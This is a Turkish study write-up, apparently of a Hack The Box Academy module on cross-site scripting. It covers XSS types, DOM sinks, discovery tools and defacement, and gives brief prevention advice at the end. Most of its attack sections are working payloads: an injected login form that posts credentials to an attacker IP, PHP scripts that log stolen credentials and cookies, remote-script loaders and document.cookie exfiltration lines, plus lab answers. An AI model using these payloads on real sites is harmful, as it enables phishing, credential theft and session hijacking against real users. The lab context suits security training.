---
{"dg-publish":true,"permalink":"/web-penters/xss/","tags":["gardenEntry"]}
---


[OWASP](https://owasp.org/www-community/attacks/xss/) 

XSS güvenlik açıkları yalnızca client tarafında çalıştırılır ve bu nedenle back-end sunucusunu doğrudan etkilemez.

XSS saldırıları tarayıcı içinde JavaScript kodu çalıştırdığından, tarayıcının JS motoruyla (yani Chrome'da V8) sınırlıdır.

Modern tarayıcılarda, güvenlik açığı bulunan web sitesinin aynı etki alanıyla da sınırlıdırlar.

Buna ek olarak, yetenekli bir araştırmacı bir web tarayıcısında binary bir güvenlik açığı tespit ederse (örneğin, Chrome'da bir Heap taşması), hedefin tarayıcısında bir JavaScript exploit'i çalıştırmak için bir XSS güvenlik açığını kullanabilir ve bu da sonunda tarayıcının sanal alanından çıkıp kullanıcının makinesinde kod çalıştırabilir.


## **XSS Türleri**  

Üç ana XSS güvenlik açığı türü vardır:

`Stored (Kalıcı) XSS`:Kullanıcı girdisi back-end veritabanında saklandığında ve daha sonra tekrar çağırıldığında görüntülendiğinde ortaya çıkan en kritik XSS türüdür (örneğin, gönderiler veya yorumlar)  

`Reflected (Kalıcı Olmayan) XSS`:Kullanıcı girdisi backend sunucusu tarafından işlendikten sonra ancak saklanmadan sayfada görüntülendiğinde oluşur (örn. arama sonucu veya hata mesajı)  

`DOM tabanlı XSS`:Kullanıcı girdisi doğrudan tarayıcıda gösterildiğinde ve back-end sunucusuna ulaşmadan (örneğin, istemci tarafı HTTP parametreleri veya bağlantı etiketleri aracılığıyla) tamamen istemci tarafında işlendiğinde ortaya çıkan bir başka Kalıcı Olmayan XSS türü


Temel fark, kullanıcı girdisinin işlendiği yerdir: **Reflected XSS'de** kullanıcı girdisi sunucu tarafında işlenir ve yanıtın bir parçası olarak tarayıcıya iletilir; **DOM tabanlı XSS'de** ise kullanıcı girdisi tamamen istemci tarafında (JavaScript ile) işlenir ve sunucu bu işleme karışmaz.


```html
<script>alert(window.origin)</script>
```

Payload, hedef uygulamanın root URL'sini (origin) JavaScript `alert()` kutusu içinde görüntüler.

![Pasted image 20241116004439.png](/img/user/resimler/Pasted%20image%2020241116004439.png)

**İpucu:** Birçok modern web uygulaması, kullanıcı girdisini işlemek için alanlar arası IFrame'ler kullanır, böylece web formu XSS'ye karşı savunmasız olsa bile, bu ana web uygulamasında bir güvenlik açığı olmayacaktır. Bu nedenle uyarı kutusunda `1` gibi statik bir değer yerine `window.origin` değerini gösteriyoruz. Bu durumda, uyarı kutusu çalıştırıldığı URL'yi gösterecek ve bir IFrame kullanılması durumunda hangi formun savunmasız olduğunu doğrulayacaktır.


```html
<script>print()</script>
```

alert() fonksiyonu engellendiyse hedef web sitesinde alternatif olarak kullanılabilir . 

![Pasted image 20241116004842.png](/img/user/resimler/Pasted%20image%2020241116004842.png)


Soru 1 : Bayrağı almak için yukarıda kullandığımız aynı yükü kullanın, ancak JavaScript kodunu url'yi göstermek yerine çerezi gösterecek şekilde değiştirin.

Payload :  <script>alert(document.cookie)</script>

![Pasted image 20241116005434.png](/img/user/resimler/Pasted%20image%2020241116005434.png)


Soru : Bayrağı almak için yukarıda kullandığımız aynı payloadı kullanın, ancak JavaScript kodunu url'yi göstermek yerine cookie'i gösterecek şekilde değiştirin.

Cevap : <script>alert(document.cookie)</script>

![Pasted image 20241116010911.png](/img/user/resimler/Pasted%20image%2020241116010911.png)


# DOM XSS
Ancak, Firefox Geliştirici Araçları'nda `Ağ` sekmesini açıp `test` öğesini yeniden eklersek, hiçbir HTTP isteğinin yapılmadığını fark ederiz:

![Pasted image 20241116011040.png](/img/user/resimler/Pasted%20image%2020241116011040.png)

URL'deki girdi parametresinin eklediğimiz öğe için bir `#` hashtag'i kullandığını görüyoruz, bu da bunun tamamen tarayıcıda işlenen client tarafı bir parametre olduğu anlamına geliyor.



## **Source & Sink**  

DOM tabanlı XSS güvenlik açığının doğasını daha iyi anlamak için, sayfada görüntülenen nesnenin Source ve Sink kavramlarını anlamamız gerekir. `Source`, kullanıcı girdisini alan JavaScript nesnesidir ve yukarıda gördüğümüz gibi bir URL parametresi veya bir girdi alanı gibi herhangi bir girdi parametresi olabilir.  

Öte yandan, `Sink` kullanıcı girdisini sayfadaki bir DOM Nesnesine yazan işlevdir. `Sink` fonksiyonu kullanıcı girdisini düzgün bir şekilde sterilize etmezse, bir XSS saldırısına karşı savunmasız olacaktır. DOM nesnelerine yazmak için yaygın olarak kullanılan JavaScript işlevlerinden bazıları şunlardır:

- `document.write()`
- `DOM.innerHTML`
- `DOM.outerHTML`

Ayrıca, DOM nesnelerine yazan `jQuery` kütüphane fonksiyonlarından bazıları şunlardır:

- `add()`
- `after()`
- `append()`


Eğer bir `Sink` fonksiyonu herhangi bir sanitizasyon olmadan (yukarıdaki fonksiyonlar gibi) tam girdiyi yazıyorsa ve başka hiçbir sanitizasyon aracı kullanılmamışsa, sayfanın XSS'ye karşı savunmasız olması gerektiğini biliriz.  

`To-Do` web uygulamasının kaynak koduna bakabilir ve `script.js` dosyasını kontrol edebiliriz ve `Source` 'un `task=` parametresinden alındığını görebiliriz

```javascript
var pos = document.URL.indexOf("task=");
var task = document.URL.substring(pos + 5, document.URL.length);
```

Bu satırların hemen altında, sayfanın `todo` DOM'daki `task` değişkenini yazmak için `innerHTML` fonksiyonunu kullandığını görüyoruz:

```javascript
document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
```

Böylece, girdiyi kontrol edebildiğimizi ve çıktının sterilize edilmediğini görebiliriz, bu nedenle bu sayfa DOM XSS'ye karşı savunmasız olmalıdır.


## **DOM Saldırıları**  

Daha önce kullandığımız XSS payload'unu denersek, çalışmayacağını göreceğiz. Bunun nedeni `innerHTML` fonksiyonunun bir güvenlik özelliği olarak içinde `<script>` etiketlerinin kullanılmasına izin vermemesidir. Yine de, aşağıdaki XSS payload 'ı gibi `<script>` etiketleri içermeyen kullandığımız başka birçok XSS payload 'ı vardır:

```html
<img src="" onerror=alert(window.origin)>
```

Yukarıdaki satır, resim bulunamadığında JavaScript kodunu çalıştırabilen bir `onerror` niteliğine sahip yeni bir HTML resim nesnesi oluşturur. Dolayısıyla, boş bir resim bağlantısı (`“”`) sağladığımız için, kodumuz `<script>` etiketlerini kullanmak zorunda kalmadan her zaman çalıştırılmalıdır:

![Pasted image 20241116011642.png](/img/user/resimler/Pasted%20image%2020241116011642.png)


Soru : Bayrağı almak için yukarıda kullandığımız aynı payload'u kullanın, ancak JavaScript kodunu url'yi göstermek yerine çerezi gösterecek şekilde değiştirin.

Cevap :  

```html
<img src="" onerror=alert(document.cookie)>
```

![Pasted image 20241116012100.png](/img/user/resimler/Pasted%20image%2020241116012100.png)



# XSS Discovery

XSS keşfinde bize yardımcı olabilecek yaygın açık kaynaklı araçlardan bazıları[ XSS Strike](https://github.com/s0md3v/XSStrike), [Brute XSS](https://github.com/rajeshmajumdar/BruteXSS) ve [XSSer'dır](https://github.com/epsylon/xsser). XSS Strike'ı git clone ile sanal makinemize klonlayarak deneyebiliriz:

```shell-session
M1R4CKCK@htb[/htb]$ git clone https://github.com/s0md3v/XSStrike.git
M1R4CKCK@htb[/htb]$ cd XSStrike
M1R4CKCK@htb[/htb]$ pip install -r requirements.txt
M1R4CKCK@htb[/htb]$ python xsstrike.py

XSStrike v3.1.4
...SNIP...
```

Daha sonra scripti çalıştırabilir ve -u kullanarak bir parametre ile bir URL sağlayabiliriz. Önceki bölümdeki Reflected XSS örneğimizle kullanmayı deneyelim:

```shell-session
M1R4CKCK@htb[/htb]$ python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 

        XSStrike v3.1.4

[~] Checking for DOM vulnerabilities 
[+] WAF Status: Offline 
[!] Testing parameter: task 
[!] Reflections found: 1 
[~] Analysing reflections 
[~] Generating payloads 
[!] Payloads generated: 3072 
------------------------------------------------------------
[+] Payload: <HtMl%09onPoIntERENTER+=+confirm()> 
[!] Efficiency: 100 
[!] Confidence: 10 
[?] Would you like to continue scanning? [y/N]
```

Gördüğümüz gibi, araç parametreyi ilk payload'tan XSS'ye karşı savunmasız olarak tanımladı. Yukarıdaki payload'u önceki alıştırmalardan birinde test ederek doğrulamaya çalışın. Diğer araçları da test etmeyi deneyebilir ve XSS güvenlik açıklarını tespit etmede ne kadar yetenekli olduklarını görmek için aynı alıştırmalarda çalıştırabilirsiniz.


### XSS Payloads

 [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md) or the one in [PayloadBox](https://github.com/payloadbox/xss-payload-list).


Not: XSS, HTML sayfasındaki herhangi bir girdiye enjekte edilebilir, bu sadece HTML girdi alanlarına özel değildir, aynı zamanda ==Cookie== veya ==User-Agent== gibi HTTP başlıklarında da olabilir (yani, değerleri sayfada görüntülendiğinde).


### Kod İncelemesi
XSS güvenlik açıklarını tespit etmenin en güvenilir yöntemi, hem back-end hem de front-end kodunu kapsaması gereken manuel kod incelemesidir. 

Yine de, bunları öğrenmekle ilgileniyorsanız, Güvenli Kodlama 101: JavaScript ve Whitebox Pentesting 101: Komut Enjeksiyonu modülleri bu konuyu kapsamlı bir şekilde ele almaktadır.


Soru : Yukarıdaki sunucuda bulunan savunmasız girdi parametresini tanımlamak için bu bölümde bahsedilen tekniklerden bazılarını kullanın. Savunmasız parametrenin adı nedir?

Cevap : email

![Pasted image 20241116024329.png](/img/user/resimler/Pasted%20image%2020241116024329.png)

![Pasted image 20241116024339.png](/img/user/resimler/Pasted%20image%2020241116024339.png)


Soru : Yukarıdaki sunucuda ne tür bir XSS bulundu? “sadece isim”

Cevap : reflected



## Defacement Elements

Bir web sayfasının ana görünümünü değiştirmek için genellikle üç HTML öğesi kullanılır:

- Background Color `document.body.style.background`
- Background `document.body.background`
- Page Title `document.title`
- Page Text `DOM.innerHTML`


Bir web sayfasının arka planını değiştirmek için belirli bir renk seçebilir veya bir resim kullanabiliriz.

```html
<script>document.body.style.background = "#141d2b"</script>
```

![Pasted image 20241116032947.png](/img/user/resimler/Pasted%20image%2020241116032947.png)

Başka bir seçenek de aşağıdaki payload'u kullanarak bir resmi arka plana ayarlamak olabilir:

```html
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
```


### Sayfa Başlığını Değiştirme
document.title JavaScript fonksiyonunu kullanarak sayfa başlığını 2Do'dan istediğimiz herhangi bir başlığa değiştirebiliriz: 

```html
<script>document.title = 'HackTheBox Academy'</script>
```

Sayfa penceresinden/sekmesinden yeni başlığımızın bir öncekinin yerini aldığını görebiliriz:

![Pasted image 20241116033053.png](/img/user/resimler/Pasted%20image%2020241116033053.png)

### Sayfa Metnini Değiştirme
Web sayfasında görüntülenen metni değiştirmek istediğimizde, bunu yapmak için çeşitli JavaScript işlevlerinden yararlanabiliriz. Örneğin, innerHTML fonksiyonunu kullanarak belirli bir HTML öğesinin/DOM'un metnini değiştirebiliriz:

```javascript
document.getElementById("todo").innerHTML = "New Text"
```

Aynı şeyi daha verimli bir şekilde gerçekleştirmek veya tek bir satırda birden fazla öğenin metnini değiştirmek için jQuery işlevlerini de kullanabiliriz (bunu yapmak için jQuery kütüphanesinin sayfa kaynağına aktarılmış olması gerekir):

```javascript
$("#todo").html('New Text');
```

Bu bize web sayfasındaki metni özelleştirmek ve ihtiyaçlarımızı karşılamak için küçük ayarlamalar yapmak için çeşitli seçenekler sunar. Ancak, bilgisayar korsanlığı grupları genellikle web sayfasında basit bir mesaj bırakıp başka bir şey bırakmadıkları için, innerHTML kullanarak ana gövdenin tüm HTML kodunu aşağıdaki gibi değiştireceğiz:

```javascript
document.getElementsByTagName('body')[0].innerHTML = "New Text"
```

Gördüğümüz gibi, body öğesini document.getElementsByTagName('body') ile belirleyebiliyoruz ve [0] belirterek, web sayfasının tüm metnini değiştirmesi gereken ilk body öğesini seçiyoruz. Aynı şeyi başarmak için jQuery de kullanabiliriz. Ancak, payload'umuzu göndermeden ve kalıcı bir değişiklik yapmadan önce, HTML kodumuzu ayrı olarak hazırlamalı ve ardından HTML kodumuzu sayfa kaynağına ayarlamak için innerHTML kullanmalıyız.

```html
<center>
    <h1 style="color: white">Cyber Security Training</h1>
    <p style="color: white">by 
        <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy">
    </p>
</center>
```

İpucu: Nihai payload'umuzda kullanmadan önce nasıl göründüğünü görmek ve beklendiği gibi çalıştığından emin olmak için HTML kodumuzu yerel olarak çalıştırmayı denemek akıllıca olacaktır.

HTML kodunu tek bir satıra indirgeyeceğiz ve önceki XSS payload'umuza ekleyeceğiz. Nihai payload aşağıdaki gibi olmalıdır:

```html
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
```

![Pasted image 20241116033257.png](/img/user/resimler/Pasted%20image%2020241116033257.png)


Sayfa kaynak kodu : 

```html
<div></div><ul class="list-unstyled" id="todo"><ul>
<script>document.body.style.background = "#141d2b"</script>
</ul><ul><script>document.title = 'HackTheBox Academy'</script>
</ul><ul><script>document.getElementsByTagName('body')[0].innerHTML = '...SNIP...'</script>
</ul></ul>
```



# Phishing

![Pasted image 20241116033428.png](/img/user/resimler/Pasted%20image%2020241116033428.png)

Bu tür resim görüntüleyiciler çevrimiçi forumlarda ve benzer web uygulamalarında yaygındır. URL üzerinde kontrol sahibi olduğumuz için, kullandığımız temel XSS payload'unu kullanarak başlayabiliriz. Ancak bu payload'u denediğimizde, hiçbir şeyin çalıştırılmadığını ve ölü resim url simgesini aldığımızı görüyoruz:

![Pasted image 20241116033503.png](/img/user/resimler/Pasted%20image%2020241116033503.png)


## Login Form Injection

```html
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

Yukarıdaki HTML kodunda OUR_IP, tun0 altında (ip a) komutu ile bulabileceğimiz VM'mizin IP'sidir. Daha sonra formdan gönderilen kimlik bilgilerini almak için bu IP'yi dinleyeceğiz. Giriş formu aşağıdaki gibi görünmelidir:


Daha sonra, XSS kodumuzu hazırlamalı ve savunmasız form üzerinde test etmeliyiz. HTML kodunu savunmasız sayfaya yazmak için document.write() JavaScript işlevini kullanabilir ve bunu daha önce XSS Discovery adımında bulduğumuz XSS payload'unda kullanabiliriz. HTML kodumuzu tek bir satıra indirgedikten ve write fonksiyonunun içine ekledikten sonra, nihai JavaScript kodu aşağıdaki gibi olmalıdır:

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

Artık XSS payload'umuzu kullanarak bu JavaScript kodunu enjekte edebiliriz (yani alert(window.origin) JavaScript Kodunu çalıştırmak yerine). Bu durumda, bir Reflected XSS güvenlik açığından yararlanıyoruz, bu nedenle Reflected XSS bölümünde yaptığımız gibi URL'yi ve XSS payload'umuzu parametrelerine kopyalayabiliriz ve kötü amaçlı URL'yi ziyaret ettiğimizde sayfa aşağıdaki gibi görünmelidir:

![Pasted image 20241116033704.png](/img/user/resimler/Pasted%20image%2020241116033704.png)


### Cleaning Up
URL alanının hala görüntülendiğini görebiliyoruz, bu da “Devam etmek için lütfen giriş yapın” cümlemizi geçersiz kılıyor. Bu nedenle, kurbanı giriş formunu kullanmaya teşvik etmek için URL alanını kaldırmalıyız, böylece sayfayı kullanabilmek için giriş yapmaları gerektiğini düşünebilirler. Bunu yapmak için JavaScript fonksiyonu document.getElementById().remove() fonksiyonunu kullanabiliriz.

Kaldırmak istediğimiz HTML öğesinin kimliğini bulmak için [CTRL+SHIFT+C] tuşlarına tıklayarak Page Inspector Picker'ı açabilir ve ardından ihtiyacımız olan öğeye tıklayabiliriz:


![Pasted image 20241116033746.png](/img/user/resimler/Pasted%20image%2020241116033746.png)

Hem kaynak kodda hem de üzerine gelinen metinde gördüğümüz gibi url formu urlform id'sine sahiptir:

```html
<form role="form" action="index.php" method="GET" id='urlform'>
    <input type="text" placeholder="Image URL" name="url">
</form>
```

Artık URL formunu kaldırmak için bu kimliği remove() işleviyle kullanabiliriz:

```javascript
document.getElementById('urlform').remove();
```

Şimdi, bu kodu önceki JavaScript kodumuza eklediğimizde (document.write işlevinden sonra), bu yeni JavaScript kodunu payload'umuzda kullanabiliriz:

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```

Güncellenmiş JavaScript kodumuzu enjekte etmeye çalıştığımızda, URL formunun gerçekten de artık görüntülenmediğini görüyoruz:

![Pasted image 20241116033834.png](/img/user/resimler/Pasted%20image%2020241116033834.png)

Ayrıca, enjekte edilen giriş formumuzdan sonra hala orijinal HTML kodundan bir parça kaldığını görüyoruz. Bu, XSS payload'umuzdan sonra bir HTML açılış yorumu ekleyerek basitçe yorum dışı bırakılarak kaldırılabilir:

```html
...PAYLOAD... <!-- 
```

Gördüğümüz gibi, bu işlem orijinal HTML kodunun kalan kısmını kaldırır ve payload'umuz hazır olmalıdır. Sayfa artık yasal olarak bir giriş gerektiriyormuş gibi görünüyor:

![Pasted image 20241116033906.png](/img/user/resimler/Pasted%20image%2020241116033906.png)


### Kimlik Bilgisi Çalınması

```shell-session
M1R4CKCK@htb[/htb]$ sudo nc -lvnp 80
listening on [any] 80 ...
```

Şimdi test:test kimlik bilgileriyle giriş yapmayı deneyelim ve elde ettiğimiz netcat çıktısını kontrol edelim (XSS yükündeki OUR_IP'yi gerçek IP'nizle değiştirmeyi unutmayın):

```shell-session
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.XX.XX] XXXXX
GET /?username=test&password=test&submit=Login HTTP/1.1
Host: 10.10.XX.XX
...SNIP...
```

Ancak, yalnızca bir netcat dinleyicisi ile dinlediğimiz için, HTTP isteğini doğru şekilde işlemeyecek ve kurban, bazı şüpheleri artırabilecek bir Bağlanılamıyor hatası alacaktır. Bu nedenle, HTTP isteğindeki kimlik bilgilerini günlüğe kaydeden ve ardından kurbanı herhangi bir enjeksiyon olmadan orijinal sayfaya döndüren basit bir PHP betiği kullanabiliriz. Bu durumda, kurban başarılı bir şekilde giriş yaptığını düşünebilir ve Resim Görüntüleyiciyi amaçlandığı gibi kullanabilir.

Aşağıdaki PHP betiği ihtiyacımız olanı yapacaktır ve bunu VM'mizde index.php olarak adlandıracağımız bir dosyaya yazacağız ve /tmp/tmpserver/ içine yerleştireceğiz (SERVER_IP'yi alıştırmamızdaki ip ile değiştirmeyi unutmayın):

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

Artık index.php dosyamız hazır olduğuna göre, daha önce kullandığımız temel netcat dinleyicisi yerine kullanabileceğimiz bir PHP dinleme sunucusu başlatabiliriz:

```shell-session
M1R4CKCK@htb[/htb]$ mkdir /tmp/tmpserver
M1R4CKCK@htb[/htb]$ cd /tmp/tmpserver
M1R4CKCK@htb[/htb]$ vi index.php #at this step we wrote our index.php file
M1R4CKCK@htb[/htb]$ sudo php -S 0.0.0.0:80
PHP 7.4.15 Development Server (http://0.0.0.0:80) started
```

Enjekte edilen giriş formuna giriş yapmayı deneyelim ve ne elde ettiğimize bakalım. Orijinal Image Viewer sayfasına yönlendirildiğimizi görüyoruz:

![Pasted image 20241116034105.png](/img/user/resimler/Pasted%20image%2020241116034105.png)

Pwnbox'ımızdaki creds.txt dosyasını kontrol edersek, giriş kimlik bilgilerini aldığımızı görürüz:

```shell-session
M1R4CKCK@htb[/htb]$ cat creds.txt
Username: test | Password: test
```

Her şey hazır olduğunda, PHP sunucumuzu başlatabilir ve XSS payload'umuzu içeren URL'yi kurbanımıza gönderebiliriz ve forma giriş yaptıklarında, kimlik bilgilerini alır ve hesaplarına erişmek için kullanırız.


Soru : Yukarıdaki sunucuda '/phishing' adresinde bulunan Görüntü URL formu için çalışan bir XSS payload'u bulmaya çalışın ve ardından bu bölümde öğrendiklerinizi kullanarak kötü niyetli bir giriş formu enjekte eden kötü niyetli bir URL hazırlayın. Ardından URL'yi kurbana göndermek için '/phishing/send.php' adresini ziyaret edin ve kurban kötü amaçlı oturum açma formuna giriş yapacaktır. Her şeyi doğru yaptıysanız, '/phishing/login.php' adresine giriş yapmak ve bayrağı elde etmek için kullanabileceğiniz kurbanın giriş kimlik bilgilerini almalısınız.

Cevap : 


1- Öncelikle /phishing sayfasına git ve şu isteği at . (İp'ni yaz)

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```

2- sonra url'yi tamamen kopyala /phishing/send.php sayfasında girdiye yaz fakat enter'a basmadan önce nc ile 80 portunu dinle . 

![Pasted image 20241116061126.png](/img/user/resimler/Pasted%20image%2020241116061126.png)
3- verilen bilgiler doğrultusunda /phsing/login.php sayfasına git bayrağı al 

![Pasted image 20241116061249.png](/img/user/resimler/Pasted%20image%2020241116061249.png)


# Session Hijacking

### Blind XSS Algılama

 Blind XSS güvenlik açığı, güvenlik açığı erişimimiz olmayan bir sayfada tetiklendiğinde ortaya çıkar.
- Contact Forms
- Reviews
- User Details
- Support Tickets
- HTTP User-Agent header

![Pasted image 20241117014510.png](/img/user/resimler/Pasted%20image%2020241117014510.png)

Gördüğümüz gibi, formu gönderdikten sonra aşağıdaki mesajı alıyoruz:

![Pasted image 20241117014516.png](/img/user/resimler/Pasted%20image%2020241117014516.png)

Bu, girdimizin nasıl işleneceğini veya tarayıcıda nasıl görüneceğini göremeyeceğimizi gösterir, çünkü Yönetici için yalnızca erişimimiz olmayan belirli bir Yönetici Panelinde görünecektir. Normal (yani kör olmayan) durumlarda, modül boyunca yaptığımız gibi bir uyarı kutusu alana kadar her alanı test edebiliriz.

Bunu yapmak için, önceki bölümde kullandığımız aynı hileyi kullanabiliriz, yani sunucumuza bir HTTP isteği gönderen bir JavaScript payload'u kullanabiliriz. JavaScript kodu çalıştırılırsa, makinemizde bir yanıt alırız ve sayfanın gerçekten savunmasız olduğunu biliriz.


###  Remote Komut Dosyası Yükleme
HTML'de JavaScript kodunu script etiketleri içine yazabiliriz, ancak aşağıdaki gibi URL'sini sağlayarak uzak bir komut dosyası da ekleyebiliriz:

```html
<script src="http://OUR_IP/script.js"></script>
```

İstenen komut dosyası adını script.js'den enjekte ettiğimiz alanın adına değiştirebiliriz, böylece VM'mizde isteği aldığımızda, komut dosyasını çalıştıran savunmasız giriş alanını aşağıdaki gibi tanımlayabiliriz:

```html
<script src="http://OUR_IP/username"></script>
```


https://xsshunter.trufflesecurity.com/ --> Blind xss injection'u için biçilmiş kaftan . 

```html
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```


Gördüğümüz gibi, çeşitli yükler '> gibi bir enjeksiyonla başlar, bu da girdimizin backend'de nasıl işlendiğine bağlı olarak çalışabilir veya çalışmayabilir. Daha önce XSS Keşfi bölümünde belirtildiği gibi, kaynak koda erişimimiz olsaydı (yani, bir DOM XSS'de), başarılı bir enjeksiyon için gerekli payload'u tam olarak yazmak mümkün olurdu. Bu nedenle Blind XSS, DOM XSS türü güvenlik açıklarında daha yüksek bir başarı oranına sahiptir.


Payload göndermeye başlamadan önce, bir önceki bölümde gösterildiği gibi netcat veya php kullanarak VM'mizde bir dinleyici başlatmamız gerekir:

```shell-session
M1R4CKCK@htb[/htb]$ mkdir /tmp/tmpserver
M1R4CKCK@htb[/htb]$ cd /tmp/tmpserver
M1R4CKCK@htb[/htb]$ sudo php -S 0.0.0.0:80
PHP 7.4.15 Development Server (http://0.0.0.0:80) started
```

```html
<script src=http://OUR_IP/fullname></script> #this goes inside the full-name field
<script src=http://OUR_IP/username></script> #this goes inside the username field
...SNIP...
```


## Session Hijacking

```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

İki payload'tan herhangi birini kullanmak bize bir cookie göndermede işe yarayacaktır, ancak ikincisini kullanacağız, çünkü sayfaya sadece bir resim ekler, bu da çok kötü niyetli görünmeyebilir, ilki ise şüpheli görünebilecek cookie grabber PHP sayfamıza gider.

Bu JavaScript yüklerinden herhangi birini sanal makinemizde de barındırılacak olan script.js dosyasına yazabiliriz:

```javascript
new Image().src='http://OUR_IP/index.php?c='+document.cookie
```

```html
<script src=http://OUR_IP/script.js></script>
```

PHP sunucumuz çalışırken, artık kodu XSS payload'umuzun bir parçası olarak kullanabilir, savunmasız girdi alanına gönderebilir ve cookie değeri ile sunucumuza bir çağrı alabiliriz. Ancak, çok sayıda cookie varsa, hangi cookie değerinin hangi cookie başlığına ait olduğunu bilemeyebiliriz. Bu nedenle, bunları yeni bir satırla bölmek ve bir dosyaya yazmak için bir PHP scripti yazabiliriz. Bu durumda, birden fazla kurban XSS istismarını tetiklese bile, tüm cookie'lerini bir dosyada sıralı olarak alacağız.

Aşağıdaki PHP betiğini index.php olarak kaydedebilir ve PHP sunucusunu tekrar çalıştırabiliriz:

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Şimdi, kurbanın savunmasız sayfayı ziyaret etmesini ve XSS payload'umuzu görüntülemesini bekliyoruz. Bunu yaptıklarında, sunucumuzda biri script.js için olmak üzere iki istek alacağız ve bu da cookie değeri ile başka bir istekte bulunacak:

```shell-session
10.10.10.10:52798 [200]: /script.js
10.10.10.10:52799 [200]: /index.php?c=cookie=f904f93c949d19d870911bf8b05fe7b2
```

Daha önce de belirtildiği gibi, gördüğümüz gibi cookie değerini doğrudan terminalde alıyoruz. Bununla birlikte, bir PHP scripti hazırladığımız için, cookies.txt dosyasını da temiz bir cookie günlüğü ile alıyoruz:

```shell-session
M1R4CKCK@htb[/htb]$ cat cookies.txt 
Victim IP: 10.10.10.1 | Cookie: cookie=f904f93c949d19d870911bf8b05fe7b2
```

Son olarak, kurbanın hesabına erişmek için bu cookie'yi login.php sayfasında kullanabiliriz. Bunu yapmak için, /hijacking/login.php sayfasına gittiğimizde, Firefox'ta Shift+F9'a tıklayarak Developer Tools'daki Storage çubuğunu açabiliriz. Ardından, sağ üst köşedeki + düğmesine tıklayabilir ve Cookie'mizi ekleyebiliriz, burada Name = 'den önceki kısım ve Value = 'den sonraki kısım çalınan cookie'mizdir:

![Pasted image 20241117030520.png](/img/user/resimler/Pasted%20image%2020241117030520.png)

Cookie'mizi ayarladıktan sonra sayfayı yenileyebiliriz ve kurban olarak erişim sağlayabiliriz:


Soru : Güvenlik açığı olan giriş alanını belirlemek ve çalışan bir XSS payload'u bulmak için bu bölümde öğrendiklerinizi tekrarlamaya çalışın ve ardından Admin'in cookie'sini almak için 'Session Hijacking' script'lerini kullanın ve bayrağı almak için 'login.php'de kullanın.

Cevap :

payload : "><script src=http://10.10.15.18></script>

Xss bulunduğu yer Profile Picture Url form yerinde. 

![Pasted image 20241117032729.png](/img/user/resimler/Pasted%20image%2020241117032729.png)

script.js dosyası 

![Pasted image 20241117034527.png](/img/user/resimler/Pasted%20image%2020241117034527.png)


index.php dosyası : 

![Pasted image 20241117034549.png](/img/user/resimler/Pasted%20image%2020241117034549.png)

hedef'e yolladığımız payload . 

"><script src=http://10.10.15.18/script.js></script><script src=http://OUR_IP:8080/script.js></script>

![Pasted image 20241117034627.png](/img/user/resimler/Pasted%20image%2020241117034627.png)


![Pasted image 20241117034510.png](/img/user/resimler/Pasted%20image%2020241117034510.png)

Cookie değerini + sekmesine tıklayıp ekleyip bayrağı alalım .
![Pasted image 20241117035513.png](/img/user/resimler/Pasted%20image%2020241117035513.png)



### XSS Önleme

## Front-end

Girdi doğrulama.

```javascript
function validateEmail(email) {
    const re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test($("#login input[name=email]").val());
}
```

Gördüğümüz gibi, bu kod e-posta giriş alanını test ediyor ve bir e-posta biçiminin Regex doğrulamasıyla eşleşip eşleşmediğini true veya false olarak döndürüyor.


### Input Sanitization
Girdi doğrulamaya ek olarak, özel karakterlerden kaçarak içinde JavaScript kodu bulunan hiçbir girdiye izin vermediğimizden her zaman emin olmalıyız. Bunun için aşağıdaki gibi [DOMPurify](https://github.com/cure53/DOMPurify) JavaScript kütüphanesini kullanabiliriz:

```javascript
<script type="text/javascript" src="dist/purify.min.js"></script>
let clean = DOMPurify.sanitize( dirty );
```

